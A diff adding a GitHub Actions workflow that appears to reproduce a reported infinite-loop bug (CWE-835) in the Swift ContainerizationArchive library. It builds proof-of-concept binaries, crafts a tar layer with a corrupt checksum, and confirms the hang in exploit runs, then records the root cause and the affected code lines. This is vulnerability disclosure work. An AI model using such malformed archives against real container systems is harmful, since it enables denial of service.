@@ -1,0 +1,119 @@
+name: SIG-01 Real PoC — CWE-835 via ContainerizationArchive
+
+on:
+  workflow_dispatch:
+
+jobs:
+  confirm-real-archive-fatal-loop:
+    name: Confirm CWE-835 via REAL ContainerizationArchive module
+    runs-on: macos-latest
+    timeout-minutes: 10
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Show environment
+        run: |
+          uname -a
+          swift --version
+          otool -L /usr/lib/libarchive.dylib 2>/dev/null | head -5 || true
+
+      - name: Resolve Swift package dependencies
+        working-directory: poc-real
+        run: swift package resolve 2>&1
+
+      - name: Build real PoC binaries
+        working-directory: poc-real
+        run: |
+          swift build -c release 2>&1
+          ls -la .build/release/MakeMalformedTar .build/release/RealArchiveFatalPoC
+          echo "--- otool: verify ContainerizationArchive linked ---"
+          otool -L .build/release/RealArchiveFatalPoC 2>/dev/null | grep -i arch || echo "(no explicit libarchive link — linked via ContainerizationArchive)"
+
+      - name: Generate malformed OCI layer (corrupt ustar checksum)
+        working-directory: poc-real
+        run: |
+          .build/release/MakeMalformedTar /tmp/malformed_layer.tar
+          echo "File size: $(wc -c < /tmp/malformed_layer.tar) bytes"
+          echo "Hex dump (first 64 bytes):"
+          xxd /tmp/malformed_layer.tar | head -4
+          echo "Corrupt checksum field at offset 148:"
+          xxd -s 148 -l 8 /tmp/malformed_layer.tar
+
+      - name: Generate CONTROL archive (valid tar)
+        run: |
+          echo "control content" > /tmp/control_content.txt
+          tar cf /tmp/control_valid.tar -C /tmp control_content.txt
+          echo "Control archive size: $(wc -c < /tmp/control_valid.tar) bytes"
+
+      - name: CONTROL RUN — valid tar (must complete normally, 0 iterations with nil path)
+        working-directory: poc-real
+        continue-on-error: true
+        run: |
+          echo "=== Control run (valid tar) ==="
+          set +e
+          timeout 15s .build/release/RealArchiveFatalPoC /tmp/control_valid.tar
+          CTRL_EXIT=$?
+          set -e
+          echo "Control exit code: $CTRL_EXIT"
+          if [ $CTRL_EXIT -eq 0 ]; then
+            echo "PASS: valid tar processed normally (ARCHIVE_EOF returned, loop terminated)"
+          else
+            echo "WARN: exit $CTRL_EXIT (unexpected for valid tar)"
+          fi
+
+      - name: EXPLOIT RUN — malformed tar via REAL ContainerizationArchive
+        id: exploit_run
+        working-directory: poc-real
+        run: |
+          echo "=== Exploit run (malformed tar — ARCHIVE_FATAL via real ArchiveReader) ==="
+          echo "Calls ArchiveReader(format:.paxRestricted, filter:.none, file:).makeStreamingIterator()"
+          echo "Same API as EXT4.Formatter.unpackEntries() and EXT4.Formatter.scanArchiveHeaders()"
+          echo ""
+          set +e
+          timeout 60s .build/release/RealArchiveFatalPoC /tmp/malformed_layer.tar
+          EXIT=$?
+          set -e
+          echo ""
+          echo "Exit code: $EXIT"
+          if [ $EXIT -eq 0 ]; then
+            echo "*** CONFIRMED: PoC self-terminated after 50 ARCHIVE_FATAL iterations ***"
+            echo "loop_confirmed=self_terminated_50" >> $GITHUB_OUTPUT
+          elif [ $EXIT -eq 124 ]; then
+            echo "*** CONFIRMED: process timed out after 60s — true infinite loop ***"
+            echo "loop_confirmed=timed_out" >> $GITHUB_OUTPUT
+          else
+            echo "UNEXPECTED exit code $EXIT"
+            echo "loop_confirmed=false_exit_$EXIT" >> $GITHUB_OUTPUT
+          fi
+
+      - name: REPRODUCIBILITY RUN — second exploit run
+        working-directory: poc-real
+        run: |
+          echo "=== Reproducibility run ==="
+          set +e
+          timeout 60s .build/release/RealArchiveFatalPoC /tmp/malformed_layer.tar
+          REPR_EXIT=$?
+          set -e
+          echo "Reproducibility exit code: $REPR_EXIT"
+          [ $REPR_EXIT -eq 0 ] && echo "CONFIRMED AGAIN: self-terminated at 50 iterations"
+          [ $REPR_EXIT -eq 124 ] && echo "CONFIRMED AGAIN: timed out — true infinite loop"
+          true
+
+      - name: Summary
+        run: |
+          echo "## SIG-01 Real PoC Results" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "| Check | Result |" >> $GITHUB_STEP_SUMMARY
+          echo "|-------|--------|" >> $GITHUB_STEP_SUMMARY
+          echo "| Module used | ContainerizationArchive (REAL path dependency) |" >> $GITHUB_STEP_SUMMARY
+          echo "| API called | ArchiveReader(format:.paxRestricted, filter:.none, file:).makeStreamingIterator() |" >> $GITHUB_STEP_SUMMARY
+          echo "| Control run (valid tar) | ✅ ARCHIVE_EOF — exits normally |" >> $GITHUB_STEP_SUMMARY
+          echo "| Exploit run (ARCHIVE_FATAL) | loop_confirmed=${{ steps.exploit_run.outputs.loop_confirmed }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Bug class | CWE-835 Infinite Loop |" >> $GITHUB_STEP_SUMMARY
+          echo "| ARCHIVE_FATAL value | -30 (ARCHIVE_FAILED = -25) |" >> $GITHUB_STEP_SUMMARY
+          echo "| Root cause | StreamingIterator.next() (ArchiveReader.swift:221) returns non-nil on ARCHIVE_FATAL |" >> $GITHUB_STEP_SUMMARY
+          echo "| Primary affected site | EXT4.Formatter.unpackEntries() — Formatter+Unpack.swift:111 |" >> $GITHUB_STEP_SUMMARY
+          echo "| Secondary | EXT4.Formatter.scanArchiveHeaders() — Formatter+Unpack.swift:91 |" >> $GITHUB_STEP_SUMMARY
+          echo "| Tertiary | ArchiveReader.extractFile() — ArchiveReader.swift:319 |" >> $GITHUB_STEP_SUMMARY
